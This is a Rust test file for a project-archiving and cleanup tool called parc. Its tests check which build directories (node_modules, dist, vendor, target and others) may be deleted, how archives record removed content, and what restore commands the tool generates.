//! The rules that decide what gets deleted. Every case here is one an earlier
//! version of this tool got wrong on a real project.

use parc::model::{Class, Verdict};
use parc::scan;

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicUsize, Ordering};

static N: AtomicUsize = AtomicUsize::new(0);

struct Fixture(PathBuf);

impl Fixture {
    fn new() -> Self {
        let n = N.fetch_add(1, Ordering::SeqCst);
        let p = std::env::temp_dir().join(format!("parc-t-{}-{n}", std::process::id()));
        let _ = fs::remove_dir_all(&p);
        fs::create_dir_all(&p).unwrap();
        Fixture(p.canonicalize().unwrap())
    }

    fn file(&self, rel: &str, body: &str) -> &Self {
        let p = self.0.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, body).unwrap();
        self
    }

    /// A directory with enough bytes in it to be worth measuring.
    fn heavy(&self, rel: &str) -> &Self {
        self.file(&format!("{rel}/payload.js"), &"x".repeat(4096));
        self
    }

    /// Backdate a file's mtime, so "abandoned" can be tested without waiting.
    fn age_file(&self, rel: &str, days: u64) -> &Self {
        let when = std::time::SystemTime::now() - std::time::Duration::from_secs(days * 86_400);
        fs::File::options()
            .write(true)
            .open(self.0.join(rel))
            .unwrap()
            .set_modified(when)
            .unwrap();
        self
    }

    fn git(&self, args: &[&str]) -> &Self {
        let ok = Command::new("git")
            .arg("-C")
            .arg(&self.0)
            .args(args)
            .output()
            .unwrap()
            .status
            .success();
        assert!(ok, "git {args:?} failed");
        self
    }

    fn repo(&self) -> &Self {
        self.git(&["init", "-q", "-b", "main"])
            .git(&["config", "user.email", "t@t.t"])
            .git(&["config", "user.name", "t"])
    }

    fn commit(&self) -> &Self {
        self.git(&["add", "-A"]).git(&["commit", "-qm", "c"])
    }

    fn path(&self) -> &Path {
        &self.0
    }
}

impl Drop for Fixture {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn artifact<'a>(p: &'a parc::model::Project, rel: &str) -> &'a parc::model::Artifact {
    p.artifacts
        .iter()
        .find(|a| a.path == rel)
        .unwrap_or_else(|| panic!("{rel} not found as an artifact: {:?}", p.artifacts))
}

#[test]
fn node_modules_with_lockfile_is_deletable() {
    let f = Fixture::new();
    f.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .heavy("node_modules/left-pad");

    let p = scan::analyze(f.path());
    assert_eq!(artifact(&p, "node_modules").class, Class::Confirmed);
}

/// Deleting a dependency tree with no lockfile is not reversible. No amount of
/// certainty about the *name* makes it safe.
#[test]
fn node_modules_without_lockfile_is_never_deletable() {
    let f = Fixture::new();
    f.file("package.json", "{}").heavy("node_modules/left-pad");

    let p = scan::analyze(f.path());
    assert_eq!(artifact(&p, "node_modules").class, Class::Review);
    assert_eq!(p.artifact_size, 0, "no deletable bytes");
}

/// A non-git project used to bypass the warning check entirely: `decide()`
/// returned early on `!is_repo` and never looked at the lockfile warning, so a
/// project with no lockfile came back ARCHIVE instead of REVIEW.
#[test]
fn missing_lockfile_forces_review_even_without_git() {
    let f = Fixture::new();
    f.file("package.json", "{}").heavy("node_modules/left-pad");

    let p = scan::analyze(f.path());
    assert_eq!(p.verdict, Verdict::Review);
}

/// A lockfile somewhere else in the tree says nothing about whether *this*
/// node_modules can be rebuilt.
#[test]
fn unrelated_nested_lockfile_does_not_authorize_root_node_modules() {
    let f = Fixture::new();
    f.file("package.json", "{}")
        .heavy("node_modules/left-pad")
        .file("tools/scratch/package.json", "{}")
        .file("tools/scratch/pnpm-lock.yaml", "lockfileVersion: 9");

    let p = scan::analyze(f.path());
    assert_eq!(
        artifact(&p, "node_modules").class,
        Class::Review,
        "a lockfile in a subfolder must not authorize deleting the root node_modules"
    );
}

/// The reverse: a workspace root lockfile does govern a package's node_modules.
#[test]
fn root_lockfile_governs_workspace_package() {
    let f = Fixture::new();
    f.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("packages/api/package.json", "{}")
        .heavy("packages/api/node_modules/left-pad");

    let p = scan::analyze(f.path());
    assert_eq!(
        artifact(&p, "packages/api/node_modules").class,
        Class::Confirmed
    );
}

/// `dist/` is a real source directory in plenty of repos. If git tracks what is
/// inside it, it is source, and size is not an argument.
#[test]
fn git_tracked_dist_is_never_touched() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .heavy("dist")
        .commit();

    let p = scan::analyze(f.path());
    assert_eq!(artifact(&p, "dist").class, Class::Blocked);
    assert_eq!(p.artifact_size, 0);
}

#[test]
fn gitignored_dist_is_deletable() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", r#"{"scripts":{"build":"vite build"}}"#)
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file(".gitignore", "dist/\n")
        .heavy("dist")
        .commit();

    let p = scan::analyze(f.path());
    assert_eq!(artifact(&p, "dist").class, Class::Confirmed);
}

/// The same directory, the same `.gitignore` line, and no `build` script.
///
/// `dist/`, `out/` and `build/` carry no lockfile, and that was read for a long
/// time as "nothing needs pinning, so deleting is free". It is the reverse: they
/// have no lockfile because a *command* rebuilds them, so the command is the thing
/// that has to survive. Gitignoring a big output directory is exactly what people
/// do with model checkpoints, exports and rendered deliverables - and an `out/`
/// with nothing to rebuild it is not build output, it is somebody's results.
///
/// The archive that dropped one of those trashed the project, verified SOUND, and
/// came with a restore recipe containing nothing.
#[test]
fn a_gitignored_build_dir_with_nothing_to_rebuild_it_is_not_deletable() {
    let f = Fixture::new();
    f.repo()
        // Scripts, but no `build` among them.
        .file("package.json", r#"{"scripts":{"test":"vitest"}}"#)
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file(".gitignore", "out/\n")
        .file("out/model-final.safetensors", &"w".repeat(4096))
        .commit();

    let p = scan::analyze(f.path());
    let a = artifact(&p, "out");
    assert_eq!(a.class, Class::Review, "{:?}", a.note);
    assert!(
        a.note.as_deref().unwrap_or_default().contains("no command"),
        "{:?}",
        a.note
    );
}

/// A build command at the repo root does not vouch for a directory deep in the
/// tree that merely shares the name.
///
/// The root `package.json` builds the app's `dist/`; it says nothing about
/// `analysis/out/`, which is git-ignored hand-computed data that happens to be
/// named `out`. The reversibility check used to climb from the directory all the
/// way to the root and accept the first `build` script it found anywhere, so this
/// distant, unrelated command certified `analysis/out/` as regenerable and `clean`
/// deleted it outright - no archive, no Trash. The command that rebuilds a
/// directory sits beside it, not at the top of an unrelated repo.
#[test]
fn a_distant_build_script_does_not_vouch_for_a_deep_lookalike_dir() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", r#"{"scripts":{"build":"next build"}}"#)
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file(".gitignore", "out/\nnode_modules\n")
        .file("analysis/out/results.parquet", &"w".repeat(4096))
        .commit();

    let p = scan::analyze(f.path());
    let a = artifact(&p, "analysis/out");
    assert_eq!(a.class, Class::Review, "{:?}", a.note);
}

/// An ambiguous cache name is asked about, not auto-deleted; an unambiguous one is
/// still removed.
///
/// `coverage/` is usually test output, but the name is not a guarantee - it is
/// also where people park real, hand-made data. A cache has nothing that *proves*
/// it regenerates (no lockfile, no build command), so git ignoring an ambiguous
/// name is a signal, not a warrant, and the tool asks. `.next/` can mean nothing
/// but a Next.js cache, so it stays deletable - the change is narrow.
#[test]
fn an_ambiguous_cache_name_is_reviewed_but_an_unambiguous_one_is_not() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", r#"{"scripts":{"test":"vitest"}}"#)
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file(".gitignore", "coverage/\n.next/\n")
        .heavy("coverage")
        .heavy(".next")
        .commit();

    let p = scan::analyze(f.path());
    assert_eq!(
        artifact(&p, "coverage").class,
        Class::Review,
        "{:?}",
        artifact(&p, "coverage").note
    );
    assert_eq!(artifact(&p, ".next").class, Class::Confirmed);
}

/// `.gitignore` lists exactly the files git does not have. Those are the reason
/// the archive exists - they must never be treated as skippable.
#[test]
fn gitignored_env_file_is_an_orphan_and_forces_archive() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file(".gitignore", ".env\n")
        .file(".env", "SECRET=1")
        .commit();

    let p = scan::analyze(f.path());
    assert!(
        p.orphans.iter().any(|o| o.path == ".env"),
        "must be an orphan: {:?}",
        p.orphans
    );
    assert_eq!(p.verdict, Verdict::Archive);
}

/// A repo whose root holds nothing but `.git` still has real node_modules two
/// levels down. Keying cleanup rules off the *root's* stack made these come back
/// with nothing to clean - 304 MB of it, on a real machine.
#[test]
fn container_repo_finds_nested_node_modules() {
    let f = Fixture::new();
    f.repo()
        .file("README.md", "container")
        .file("tool-a/package.json", "{}")
        .file("tool-a/pnpm-lock.yaml", "lockfileVersion: 9")
        .heavy("tool-a/node_modules/left-pad")
        .file("tool-b/package.json", "{}")
        .file("tool-b/pnpm-lock.yaml", "lockfileVersion: 9")
        .heavy("tool-b/node_modules/left-pad");

    let p = scan::analyze(f.path());
    assert_eq!(artifact(&p, "tool-a/node_modules").class, Class::Confirmed);
    assert_eq!(artifact(&p, "tool-b/node_modules").class, Class::Confirmed);
    assert!(p.artifact_size > 0);
}

/// Nothing in the rule table matches a name, so nothing is a candidate - no
/// matter how big it is.
#[test]
fn unknown_large_directory_is_not_a_candidate() {
    let f = Fixture::new();
    f.file("package.json", "{}").heavy("uploads");

    let p = scan::analyze(f.path());
    assert!(p.artifacts.is_empty(), "{:?}", p.artifacts);
    assert_eq!(p.artifact_size, 0);
}

/// `target/` belongs to Rust and Maven. In a Node project it is somebody's data.
#[test]
fn rule_does_not_apply_across_stacks() {
    let f = Fixture::new();
    f.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .heavy("target");

    let p = scan::analyze(f.path());
    assert_eq!(artifact(&p, "target").class, Class::Blocked);
    assert_eq!(p.artifact_size, 0);
}

#[test]
fn fully_pushed_clean_repo_is_redundant() {
    let bare = Fixture::new();
    Command::new("git")
        .args(["init", "-q", "--bare"])
        .arg(bare.path())
        .status()
        .unwrap();

    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("src/index.js", "console.log(1)")
        .commit()
        .git(&["remote", "add", "origin", bare.path().to_str().unwrap()])
        .git(&["push", "-q", "-u", "origin", "main"]);

    let p = scan::analyze(f.path());
    assert_eq!(
        p.verdict,
        Verdict::Redundant,
        "a repo complete on the remote must be deletable: {:?}",
        p.reasons
    );
}

#[test]
fn uncommitted_work_blocks_redundant() {
    let bare = Fixture::new();
    Command::new("git")
        .args(["init", "-q", "--bare"])
        .arg(bare.path())
        .status()
        .unwrap();

    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .commit()
        .git(&["remote", "add", "origin", bare.path().to_str().unwrap()])
        .git(&["push", "-q", "-u", "origin", "main"])
        .file("src/wip.js", "// work in progress");

    let p = scan::analyze(f.path());
    assert_eq!(p.verdict, Verdict::Archive);
}

/// Finder rewrites `.DS_Store` in folders nobody has opened an editor on for a
/// year. Trusting raw filesystem mtime made a project whose last real change was
/// 18 months ago report as touched two months ago.
#[test]
fn a_fresh_ds_store_does_not_make_a_dead_project_look_alive() {
    let f = Fixture::new();
    f.file("package.json", "{}").file("src/index.js", "old");
    f.age_file("package.json", 800);
    f.age_file("src/index.js", 800);

    // Written just now, as Finder would leave it.
    f.file(".DS_Store", "junk");

    let p = scan::analyze(f.path());
    let age = p.age_days().expect("age must be computable");
    assert!(
        age > 700,
        "source changed 800 days ago - a fresh .DS_Store must not make the project look alive (age: {age}d)"
    );
}

/// And the mirror image, which is the one that would actually destroy work: a
/// repo whose HEAD is from 2022 but whose files are edited every day. Judging by
/// the last commit alone would archive a project its owner is still using.
#[test]
fn an_old_head_does_not_make_a_live_project_look_dead() {
    let f = Fixture::new();
    f.repo().file("package.json", "{}");

    let ok = Command::new("git")
        .arg("-C")
        .arg(f.path())
        .args(["commit", "-qm", "old", "--allow-empty"])
        .env("GIT_AUTHOR_DATE", "2022-08-16T00:00:00")
        .env("GIT_COMMITTER_DATE", "2022-08-16T00:00:00")
        .status()
        .unwrap()
        .success();
    assert!(ok);

    // Uncommitted, but edited today.
    f.file("src/index.js", "wrote this today");

    let p = scan::analyze(f.path());
    let age = p.age_days().expect("age must be computable");
    assert!(
        age < 7,
        "files changed today - a 2022 HEAD must not make the project look dead (age: {age}d)"
    );
}

/// A package inside a monorepo has its `.git` one level up. Archiving the
/// package folder alone silently ships zero history - while the report cheerfully
/// prints the parent's branch and commit, which makes it look intentional.
#[test]
fn a_package_inside_a_larger_repo_refuses_to_archive_quietly() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("packages/api/package.json", "{}")
        .file("packages/api/src/index.js", "1")
        .commit();

    let p = scan::analyze(&f.path().join("packages/api"));
    assert_eq!(
        p.verdict,
        Verdict::Review,
        "a sub-package belonging to a parent repo must not be archived silently: {:?}",
        p.reasons
    );
    assert!(
        p.warnings.iter().any(|w| w.contains("no .git")),
        "it must say history is not preserved: {:?}",
        p.warnings
    );
}

/// The recipe is written while the project is still in front of us. Whoever
/// unpacks this in two years can see none of what it was derived from.
#[test]
fn the_restore_recipe_covers_what_was_removed() {
    let f = Fixture::new();
    f.file(
        "package.json",
        r#"{"engines":{"node":"22"},"scripts":{"build":"tsc"}}"#,
    )
    .file("pnpm-lock.yaml", "lockfileVersion: 9")
    .file("prisma/schema.prisma", "generator client {}")
    .file(".gitignore", "node_modules\ndist\n")
    .heavy("node_modules/left-pad")
    .heavy("dist")
    .repo()
    .commit();

    let p = scan::analyze(f.path());
    let plan = parc::recipe::plan(f.path(), &p);
    let cmds: Vec<&str> = plan.iter().map(|s| s.cmd.as_str()).collect();

    assert!(cmds.contains(&"pnpm install"), "{cmds:?}");
    assert!(cmds.contains(&"pnpm prisma generate"), "{cmds:?}");
    assert!(cmds.contains(&"pnpm run build"), "{cmds:?}");

    // Installing is the difference between a working checkout and a folder of
    // text; building usually is not.
    let install = plan.iter().find(|s| s.cmd == "pnpm install").unwrap();
    assert!(!install.optional);
    assert!(plan.iter().find(|s| s.cmd == "pnpm run build").unwrap().optional);

    assert_eq!(parc::recipe::runtime(f.path()).as_deref(), Some("node 22"));
}

/// No step may claim to rebuild something the archive still contains - a
/// `pnpm install` in a project whose node_modules was preserved is noise, and
/// noise in a recovery procedure is how people stop reading it.
#[test]
fn the_recipe_stays_empty_when_nothing_was_removed() {
    let f = Fixture::new();
    f.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("src/index.js", "1");

    let p = scan::analyze(f.path());
    assert!(parc::recipe::plan(f.path(), &p).is_empty());
}

/// Where `move_to_trash` would have put this file.
fn trashed(file: &Path) -> PathBuf {
    PathBuf::from(std::env::var("HOME").unwrap())
        .join(".Trash")
        .join(file.file_name().unwrap())
}

/// A `go.sum` says nothing about whether `composer install` can put a PHP
/// `vendor/` back.
///
/// Go, PHP and Ruby all vendor into a directory called `vendor`, and their
/// lockfiles were once pooled into a single flat list - so any one of the three
/// vouched for all three. A Go checksum file at the root of a monorepo authorized
/// deleting `services/payments/vendor`, a Composer tree with no `composer.lock`
/// anywhere in it, and `parc setup` afterwards had not one step to offer: the tool
/// deleted what it could not put back, which is the only thing it must never do.
#[test]
fn one_languages_lockfile_never_vouches_for_anothers_vendor() {
    let f = Fixture::new();
    f.repo()
        .file(".gitignore", "vendor/\n")
        .file("go.mod", "module x")
        .file("go.sum", "h1:abc")
        .file("services/payments/composer.json", r#"{"require":{}}"#)
        .heavy("services/payments/vendor/stripe")
        .commit();

    let p = scan::analyze(f.path());
    let a = artifact(&p, "services/payments/vendor");
    assert_eq!(a.class, Class::Review, "{:?}", a.note);
    // And it says which file was actually missing, not all three of them.
    let note = a.note.as_deref().unwrap_or_default();
    assert!(note.contains("composer.lock"), "{note}");
    assert!(!note.contains("go.sum"), "{note}");
}

/// Rails keeps hand-written source in `vendor/assets`, so an ignored *ancestor*
/// may never vouch for a `vendor/`.
///
/// An ignored ancestor is a weaker claim than "git says this directory is
/// generated", and the two were allowed to substitute for each other whenever a
/// lockfile happened to exist. A project living in a directory its parent repo
/// ignored - the only copy of it anywhere - had `vendor/assets/javascripts` deleted
/// on the strength of a `Gemfile.lock` sitting beside it.
///
/// The escape hatch survives, but only for directories the toolchain owns every
/// byte of (`rule.owned`): that is what `a_wholly_ignored_ios_directory_still_yields_its_pods`
/// locks down, and `vendor` is not one of them.
#[test]
fn an_ignored_ancestor_never_vouches_for_a_vendor_directory() {
    let outer = Fixture::new();
    outer
        .repo()
        .file(".gitignore", "sandbox/\n")
        .file("README.md", "x")
        .commit();

    let app = outer.path().join("sandbox/railsapp");
    for (rel, body) in [
        ("Gemfile", "source 'https://rubygems.org'"),
        ("Gemfile.lock", "GEM"),
        // Hand-written, published nowhere, and in no repository on earth.
        ("vendor/assets/javascripts/legacy_datepicker.js", "// mine"),
        ("vendor/bundle/gems/rails.rb", "gem bytes"),
    ] {
        let p = app.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, body).unwrap();
    }

    let p = scan::analyze(&app);
    let a = artifact(&p, "vendor");
    assert_eq!(a.class, Class::Review, "{:?}", a.note);
}

/// A venv is per-directory. A `poetry.lock` at the repo root does not create
/// `research/legacy/venv`, and `poetry install` run there never will.
///
/// The lockfile search used to climb until it found anything lock-shaped. It
/// climbed straight past this sub-project's `requirements.txt` - which names
/// versions and pins nothing, and is deliberately not a lockfile here - reached the
/// root, and called the venv reversible on the strength of a lockfile describing a
/// different environment entirely.
#[test]
fn a_root_lockfile_does_not_vouch_for_a_nested_projects_venv() {
    let f = Fixture::new();
    f.repo()
        .file(".gitignore", "venv/\n")
        .file("pyproject.toml", "[tool.poetry]")
        .file("poetry.lock", "lock")
        .file("research/legacy/requirements.txt", "django==1.9")
        .heavy("research/legacy/venv/lib")
        .commit();

    let p = scan::analyze(f.path());
    let a = artifact(&p, "research/legacy/venv");
    assert_eq!(a.class, Class::Review, "{:?}", a.note);
}

/// `.wrangler/state` is the local D1 database, the KV store, R2 and Durable Object
/// state: months of seeded development data that no command anywhere regenerates.
///
/// It was on the rule table as `ambiguous: false` with no lockfile, which made it
/// Confirmed even in a project with no git repo at all - the single most permissive
/// combination the classifier has. `parc clean` unlinked the sqlite file outright.
///
/// It is off the table now, for the same reason `log/` and `tmp/` are: it surfaces
/// as an orphan instead, which is what it is - something git has no copy of, and
/// the reason to keep an archive.
#[test]
fn local_cloudflare_state_is_not_an_artifact() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", r#"{"scripts":{"build":"wrangler deploy"}}"#)
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file(".gitignore", ".wrangler/\n")
        .file("src/index.ts", "export default {}")
        .file(".wrangler/state/v3/d1/db.sqlite", "seeded months ago")
        .commit();

    let p = scan::analyze(f.path());
    assert!(
        !p.artifacts.iter().any(|a| a.rule == ".wrangler"),
        ".wrangler must not be a deletion candidate"
    );
    assert_eq!(p.artifact_size, 0);
    assert!(
        p.orphans.iter().any(|o| o.path.starts_with(".wrangler")),
        "must be among what the archive keeps: {:?}",
        p.orphans
    );
}

/// `File::open` on a FIFO with no writer blocks inside `open(2)` and never comes
/// back. One `mkfifo` in a project tree hung `parc backup` forever - and with it
/// every project after it in the nightly run.
///
/// A FIFO is a rendezvous point, not a file: there is no content to lose by leaving
/// it out, so it is left out and said out loud.
#[test]
fn a_fifo_in_the_tree_does_not_hang_the_archiver() {
    let lib = Fixture::new();
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("src/index.js", "1")
        .commit();

    assert!(Command::new("mkfifo")
        .arg(f.path().join("pipe"))
        .status()
        .unwrap()
        .success());

    let file = parc::archive::create(
        f.path(),
        &parc::archive::Options {
            out_dir: lib.path().to_path_buf(),
            level: 1,
            delete: false,
            force: true,
            overwrite: false,
            yes: true,
            encrypt: None,
        },
    )
    .unwrap();

    let mf = parc::archive::read_manifest(&file, None).unwrap();
    assert!(mf.files.iter().any(|x| x.path == "src/index.js"));
    assert!(
        !mf.files.iter().any(|x| x.path == "pipe"),
        "a FIFO must not go into the archive"
    );
}

/// Build a real archive of `proj` inside `lib`, and hand back the file.
fn archived(proj: &Fixture, lib: &Fixture) -> PathBuf {
    proj.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("src/index.js", "console.log(1)")
        .repo()
        .commit();

    parc::archive::create(
        proj.path(),
        &parc::archive::Options {
            out_dir: lib.path().to_path_buf(),
            level: 1,
            delete: false,
            force: false,
            overwrite: false,
            yes: true,
            encrypt: None,
        },
    )
    .unwrap()
}

/// Everything needed to answer "what was this and what does it need?" has to
/// survive inside the archive file. Nothing else does: the project it describes
/// is usually gone by the time anyone asks.
#[test]
fn the_archive_carries_what_was_removed_and_how_to_rebuild_it() {
    let lib = Fixture::new();
    let proj = Fixture::new();

    proj.file(
        "package.json",
        r#"{"engines":{"node":"22"},"scripts":{"build":"tsc"}}"#,
    )
    .file("pnpm-lock.yaml", "lockfileVersion: 9")
    .file("prisma/schema.prisma", "generator client {}")
    .file(".gitignore", "node_modules\ndist\n")
    .file("src/index.js", "console.log(1)")
    .heavy("node_modules/left-pad")
    .heavy("dist")
    .repo()
    .commit();

    let file = parc::archive::create(
        proj.path(),
        &parc::archive::Options {
            out_dir: lib.path().to_path_buf(),
            level: 1,
            delete: false,
            force: false,
            overwrite: false,
            yes: true,
            encrypt: None,
        },
    )
    .unwrap();

    // Read it back the way `show` does - from the archive, not from the project.
    let mf = parc::archive::read_manifest(&file, None).unwrap();

    assert!(
        mf.removed.iter().any(|r| r.path == "node_modules" && r.size > 0),
        "what was removed must be written in the archive: {:?}",
        mf.removed
    );
    let cmds: Vec<&str> = mf.restore_plan.iter().map(|s| s.cmd.as_str()).collect();
    assert!(cmds.contains(&"pnpm install"), "{cmds:?}");
    assert_eq!(mf.runtime.as_deref(), Some("node 22"));

    // The lockfile is what makes `pnpm install` a promise rather than a hope, so
    // it must never be one of the things that got stripped out.
    assert!(
        mf.files.iter().any(|f| f.path == "pnpm-lock.yaml"),
        "the lockfile must be in the archive"
    );
}

/// Archives written before the recipe existed have an empty `restore_plan`. They
/// still record what was removed, and the extracted tree still has the lockfile -
/// so the plan is derivable. Telling someone "project ready" while their
/// `node_modules` is missing is exactly the confusion this tool exists to end.
#[test]
fn an_old_archive_without_a_recipe_still_gets_one() {
    let f = Fixture::new();
    f.file("package.json", r#"{"scripts":{"build":"tsc"}}"#)
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("prisma/schema.prisma", "generator client {}");

    // What such a manifest carries: the removals, but no plan.
    let removed = vec![parc::manifest::Removed {
        path: "node_modules".into(),
        size: 720 * 1024 * 1024,
        rule: "node_modules".into(),
    }];

    let plan = parc::recipe::plan_for(f.path(), Some("pnpm"), &["node".to_string()], &removed);
    let cmds: Vec<&str> = plan.iter().map(|s| s.cmd.as_str()).collect();

    assert!(cmds.contains(&"pnpm install"), "{cmds:?}");
    assert!(cmds.contains(&"pnpm prisma generate"), "{cmds:?}");
}

/// PHP's `vendor/` was being cleaned with no way back written down: the rule
/// table knew composer generated it, the recipe never said `composer install`.
#[test]
fn php_vendor_is_cleaned_and_composer_brings_it_back() {
    let f = Fixture::new();
    f.repo()
        .file("composer.json", "{}")
        .file("composer.lock", "{}")
        .file(".gitignore", "vendor/\n")
        .file("index.php", "<?php echo 1;")
        .heavy("vendor/monolog")
        .commit();

    let p = scan::analyze(f.path());
    assert_eq!(artifact(&p, "vendor").class, Class::Confirmed);

    let cmds: Vec<String> = parc::recipe::plan(f.path(), &p)
        .into_iter()
        .map(|s| s.cmd)
        .collect();
    assert!(cmds.contains(&"composer install".to_string()), "{cmds:?}");
}

/// Ruby had no rules at all: a Rails app with 400 MB of vendored gems reported
/// nothing to clean.
#[test]
fn ruby_gems_are_cleaned_and_bundler_brings_them_back() {
    let f = Fixture::new();
    f.repo()
        .file("Gemfile", "source 'https://rubygems.org'")
        .file("Gemfile.lock", "GEM")
        .file(".bundle/config", "BUNDLE_PATH: vendor/bundle")
        .file(".gitignore", "vendor/\ntmp/\n")
        .file("app/models/user.rb", "class User; end")
        .heavy("vendor/bundle/ruby")
        .heavy("tmp/cache")
        .commit();

    let p = scan::analyze(f.path());
    assert_eq!(artifact(&p, "vendor").class, Class::Confirmed);

    // `tmp/` is not on the rule table at all, for exactly the reason `log/` is not.
    // Rails keeps its cache and its pids in there - and ActiveStorage keeps its
    // disk blobs, in `tmp/storage`: every file a user ever uploaded to this
    // instance, with nothing anywhere that puts them back. A rule is a directory
    // *name*; it cannot reach inside and keep the half that matters.
    assert!(
        !p.artifacts.iter().any(|a| a.rule == "tmp"),
        "tmp must not be a deletion candidate"
    );
    // And being ignored by git, it is precisely what the archive exists to carry.
    assert!(
        p.orphans.iter().any(|o| o.path.starts_with("tmp")),
        "tmp must be among what the archive keeps: {:?}",
        p.orphans
    );

    let cmds: Vec<String> = parc::recipe::plan(f.path(), &p)
        .into_iter()
        .map(|s| s.cmd)
        .collect();
    assert!(cmds.contains(&"bundle install".to_string()), "{cmds:?}");

    // The config that tells bundler where the gems go is source, and the archive
    // keeps it - otherwise `bundle install` would put them somewhere else.
    assert!(!p.orphans.iter().any(|o| o.path.contains("vendor")));
}

/// Rails keeps real source in `vendor/assets`. If git only ignores part of
/// `vendor/`, the tool must not take the whole directory on the strength of the
/// name - a human decides.
#[test]
fn a_partially_ignored_vendor_is_never_taken_wholesale() {
    let f = Fixture::new();
    f.repo()
        .file("Gemfile", "source 'https://rubygems.org'")
        .file("Gemfile.lock", "GEM")
        .file(".gitignore", "vendor/bundle/\n")
        .file("vendor/assets/logo.css", "body{}") // source, git tracks it
        .heavy("vendor/bundle/ruby")
        .commit();

    let p = scan::analyze(f.path());
    assert_eq!(
        artifact(&p, "vendor").class,
        Class::Blocked,
        "git tracks the files inside vendor/ - this is source"
    );
    assert_eq!(p.artifact_size, 0, "no deletable bytes");
}

/// A log is generated but it is not *regenerable* - nothing rebuilds last year's
/// production log from source. Deleting one is data loss wearing an artifact's coat.
#[test]
fn rails_logs_are_never_an_artifact() {
    let f = Fixture::new();
    f.repo()
        .file("Gemfile", "source 'https://rubygems.org'")
        .file("Gemfile.lock", "GEM")
        .file(".gitignore", "log/\n")
        .heavy("log")
        .commit();

    let p = scan::analyze(f.path());
    assert!(
        !p.artifacts.iter().any(|a| a.path == "log"),
        "log/ must not be a deletion candidate: {:?}",
        p.artifacts
    );
    assert_eq!(p.artifact_size, 0);
}

fn cmds(root: &Path, p: &parc::model::Project) -> Vec<String> {
    parc::recipe::plan(root, p).into_iter().map(|s| s.cmd).collect()
}

/// Maven's `target/` shares a name with Cargo's, and the rule table lets both
/// claim it - but `cargo build` in a Maven project is nonsense.
#[test]
fn maven_target_is_rebuilt_by_maven_not_cargo() {
    let f = Fixture::new();
    f.repo()
        .file("pom.xml", "<project/>")
        .file(".gitignore", "target/\n")
        .file("src/main/java/App.java", "class App {}")
        .heavy("target/classes")
        .commit();

    let p = scan::analyze(f.path());
    assert_eq!(artifact(&p, "target").class, Class::Confirmed);

    let c = cmds(f.path(), &p);
    assert!(c.contains(&"mvn package -DskipTests".to_string()), "{c:?}");
    assert!(!c.iter().any(|x| x.contains("cargo")), "{c:?}");
}

/// The wrapper is the only invocation a project is actually tested against, and
/// in a multi-module Android repo the build directory is nowhere near the root:
/// `./gradlew build` from the project root builds nothing.
#[test]
fn gradle_uses_the_wrapper_from_the_directory_that_owns_it() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", r#"{"name":"rn-app"}"#)
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("android/build.gradle", "// root project")
        .file("android/gradlew", "#!/bin/sh\n")
        .file("android/app/build.gradle", "// app module")
        .file(".gitignore", "node_modules\nandroid/app/build/\nandroid/.gradle/\n")
        .heavy("android/app/build/outputs")
        .heavy("android/.gradle/caches")
        .commit();

    let p = scan::analyze(f.path());
    let plan = parc::recipe::plan(f.path(), &p);
    let gradle = plan
        .iter()
        .find(|s| s.cmd.contains("gradle"))
        .unwrap_or_else(|| panic!("no gradle step: {:?}", cmds(f.path(), &p)));

    assert_eq!(gradle.cmd, "./gradlew build");
    assert_eq!(gradle.dir.as_deref(), Some("android"));

    // One build brings back both `.gradle/` and `build/` - saying it twice would
    // make whoever is following this at 2am wonder what they missed.
    assert_eq!(
        plan.iter().filter(|s| s.cmd.contains("gradle")).count(),
        1,
        "{plan:?}"
    );
}

/// git collapses its ignored list to the topmost directory that is entirely
/// ignored: an `android/app` holding nothing but `build/` is reported as
/// `android/app/`, never as `android/app/build/`. Looking the artifact up by its
/// exact path missed it, and the largest directory in the project - hundreds of
/// megabytes of APK output - came back REVIEW instead of removable.
#[test]
fn an_artifact_under_a_fully_ignored_parent_is_still_ignored() {
    let f = Fixture::new();
    f.repo()
        .file("build.gradle", "// root")
        .file("settings.gradle", "// modules")
        // `app/` holds nothing but the ignored build output, so git reports the
        // whole directory as ignored rather than the `build/` inside it.
        .file(".gitignore", "app/build/\n")
        .heavy("app/build/outputs")
        .commit();

    let p = scan::analyze(f.path());
    assert_eq!(
        artifact(&p, "app/build").class,
        Class::Confirmed,
        "if the parent is ignored, so is the artifact: {:?}",
        p.artifacts
    );
    assert!(p.artifact_size > 0);
}

/// No wrapper in the repo: fall back to whatever is on PATH rather than emitting
/// a command that cannot run.
#[test]
fn gradle_without_a_wrapper_falls_back_to_the_global_tool() {
    let f = Fixture::new();
    f.repo()
        .file("build.gradle", "// root")
        .file(".gitignore", "build/\n.gradle/\n")
        .heavy("build/libs")
        .commit();

